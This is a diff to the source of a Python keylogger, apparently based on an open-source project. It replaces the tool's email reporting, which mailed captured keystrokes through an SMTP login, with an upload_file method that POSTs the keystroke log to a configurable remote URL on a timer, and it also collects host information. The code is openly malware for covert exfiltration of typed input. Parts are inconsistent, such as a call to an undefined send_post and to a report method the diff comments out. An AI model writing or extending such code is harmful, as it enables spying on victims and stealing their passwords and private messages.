@@ -22,15 +22,19 @@ except ModuleNotFoundError:
 
 
 finally:
-    EMAIL_ADDRESS = "YOUR_USERNAME"
-    EMAIL_PASSWORD = "YOUR_PASSWORD"
+    DOMAIN = "YOUR_DOMAIN"
+    #EMAIL_ADDRESS = "YOUR_USERNAME"
+    #EMAIL_PASSWORD = "YOUR_PASSWORD"
     SEND_REPORT_EVERY = 60 # as in seconds
     class KeyLogger:
-        def __init__(self, time_interval, email, password):
+        #EDIT THE FOLLOWING SO THAT THERE ARE NO ERRORS WITH "email" or "password"
+        def __init__(self, time_interval, file_path, dest_url):
             self.interval = time_interval
             self.log = "KeyLogger Started..."
-            self.email = email
-            self.password = password
+            self.path = file_path
+            self.url = dest_url
+            #self.email = email
+            #self.password = password
 
         def appendlog(self, string):
             self.log = self.log + string
@@ -60,27 +64,41 @@ finally:
 
             self.appendlog(current_key)
 
-        def send_mail(self, email, password, message):
-            sender = "Private Person <from@example.com>"
-            receiver = "A Test User <to@example.com>"
+        #def send_mail(self, email, password, message):
+            #sender = "Private Person <from@example.com>"
+            #receiver = "A Test User <to@example.com>"
 
-            m = f"""\
-            Subject: main Mailtrap
-            To: {receiver}
-            From: {sender}
+            #m = f"""\
+            #Subject: main Mailtrap
+            #To: {receiver}
+            #From: {sender}
 
-            Keylogger by aydinnyunus\n"""
+            #Keylogger by aydinnyunus\n"""
 
-            m += message
-            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-                server.login(email, password)
-                server.sendmail(sender, receiver, message)
+            #m += message
+            #with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
+            #    server.login(email, password)
+            #    server.sendmail(sender, receiver, message)
 
-        def report(self):
-            self.send_mail(self.email, self.password, "\n\n" + self.log)
-            self.log = ""
-            timer = threading.Timer(self.interval, self.report)
-            timer.start()
+        #
+        def upload_file(self):
+            with open(self.path, 'rb') as file:
+                files = {'file': (self.path, file)}
+                response = self.send_post(self.url, files=files)
+                timer = threading.Timer(self.interval, self.report)
+                timer.start()        
+            # Check the status code of the response
+                if response.status_code == 200:
+                    print("File uploaded successfully.")
+                else:
+                    print(f"Failed to upload file. Status code: {response.status_code}")
+                    print(response.text)        
+                
+        #def report(self):
+            #self.send_post(self.path, self.url, "\n\n" + self.log)
+            #self.log = ""
+            #timer = threading.Timer(self.interval, self.report)
+            #timer.start()
 
         def system_information(self):
             hostname = socket.gethostname()
